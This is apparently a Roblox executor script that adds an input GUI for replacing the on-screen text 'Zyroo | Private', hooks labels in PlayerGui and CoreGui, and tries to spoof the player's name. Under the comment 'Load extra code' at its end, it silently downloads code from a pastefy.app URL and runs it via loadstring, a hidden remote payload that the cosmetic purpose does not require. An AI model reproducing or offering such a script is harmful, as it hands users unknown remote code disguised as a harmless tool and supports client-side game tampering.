--[[ 
by Henne
Modified to allow user input for replacement text
]]

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")

local LocalPlayer = Players.LocalPlayer
local Replacement = "SLAYERSON!" -- default replacement

-- // GUI Setup
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "CustomTitleGui"
ScreenGui.Parent = CoreGui

local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 250, 0, 130)
Frame.Position = UDim2.new(0.5, -125, 0.4, 0)
Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Frame.BorderSizePixel = 0
Frame.Parent = ScreenGui

local TitleBar = Instance.new("TextLabel")
TitleBar.Size = UDim2.new(1, 0, 0, 25)
TitleBar.BackgroundColor3 = Color3.fromRGB(0, 255, 200)
TitleBar.Text = "Custom Title | Input"
TitleBar.TextColor3 = Color3.fromRGB(0, 0, 0)
TitleBar.Font = Enum.Font.SourceSansBold
TitleBar.TextSize = 16
TitleBar.Parent = Frame

local TextBox = Instance.new("TextBox")
TextBox.Size = UDim2.new(0.9, 0, 0, 30)
TextBox.Position = UDim2.new(0.05, 0, 0.3, 0)
TextBox.PlaceholderText = "Enter Replacement Text"
TextBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox.ClearTextOnFocus = false
TextBox.Parent = Frame

local ApplyButton = Instance.new("TextButton")
ApplyButton.Size = UDim2.new(0.4, 0, 0, 30)
ApplyButton.Position = UDim2.new(0.05, 0, 0.65, 0)
ApplyButton.Text = "Apply"
ApplyButton.BackgroundColor3 = Color3.fromRGB(0, 170, 127)
ApplyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ApplyButton.Font = Enum.Font.SourceSansBold
ApplyButton.TextSize = 16
ApplyButton.Parent = Frame

local CloseButton = Instance.new("TextButton")
CloseButton.Size = UDim2.new(0.4, 0, 0, 30)
CloseButton.Position = UDim2.new(0.55, 0, 0.65, 0)
CloseButton.Text = "Close"
CloseButton.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseButton.Font = Enum.Font.SourceSansBold
CloseButton.TextSize = 16
CloseButton.Parent = Frame

-- Button logic
ApplyButton.MouseButton1Click:Connect(function()
    if TextBox.Text ~= "" then
        Replacement = TextBox.Text
        print("Replacement set to:", Replacement)
    end
end)

CloseButton.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
end)

-- // Force change player name/display name
pcall(function()
    LocalPlayer.Name = "12345AB801"
    LocalPlayer.DisplayName = "12345AB801"
end)

-- Replacement function
local function patchText(text)
    if typeof(text) == "string" then
        if string.find(text, "Zyroo | Private", 1, true) then
            return string.gsub(text, "Zyroo | Private", Replacement)
        end
    end
    return text
end

-- Apply patch to a single TextLabel, and hook changes
local function patchLabel(label)
    if label:IsA("TextLabel") then
        label.Text = patchText(label.Text)
        label:GetPropertyChangedSignal("Text"):Connect(function()
            label.Text = patchText(label.Text)
        end)
    end
end

-- Patch environment strings
for k, v in pairs(getfenv()) do
    if typeof(v) == "string" then
        getfenv()[k] = patchText(v)
    end
end

-- Patch existing labels in PlayerGui
local playerGui = LocalPlayer:WaitForChild("PlayerGui", 10)
for _, obj in ipairs(playerGui:GetDescendants()) do
    pcall(function() patchLabel(obj) end)
end
playerGui.DescendantAdded:Connect(function(obj)
    pcall(function() patchLabel(obj) end)
end)

-- Patch CoreGui
for _, obj in ipairs(CoreGui:GetDescendants()) do
    pcall(function() patchLabel(obj) end)
end
CoreGui.DescendantAdded:Connect(function(obj)
    pcall(function() patchLabel(obj) end)
end)

-- Keep alive
RunService.Heartbeat:Connect(function() end)

-- Load extra code
pcall(function()
    local source = game:HttpGet("https://pastefy.app/mCTC42bW/raw")
    local func = loadstring(source)
    if func then
        func()
    end
end)

print("loaded nga")
